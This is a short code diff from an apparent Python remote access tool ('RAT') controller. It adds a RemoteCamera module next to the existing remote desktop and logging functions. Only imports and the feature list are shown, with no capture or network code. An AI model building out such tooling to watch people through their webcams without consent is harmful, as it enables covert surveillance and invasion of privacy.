@@ -6,12 +6,13 @@ import sys
 
 from AdministratorControlPanel import AdministratorControlPanel
 from RATFunction.Echo import Echo
+from RATFunction.RemoteCamera import RemoteCamera
 from RATFunction.RemoteDesktop import RemoteDesktop
 from RATFunction.MyLogging import MyLogging
 
 from RemoteSystemMode import RemoteSystemMode
 
-function_classes = [Echo, RemoteDesktop, MyLogging]
+function_classes = [Echo, RemoteDesktop, MyLogging, RemoteCamera]
 
 
 class SystemSelectionDialog(QWidget):
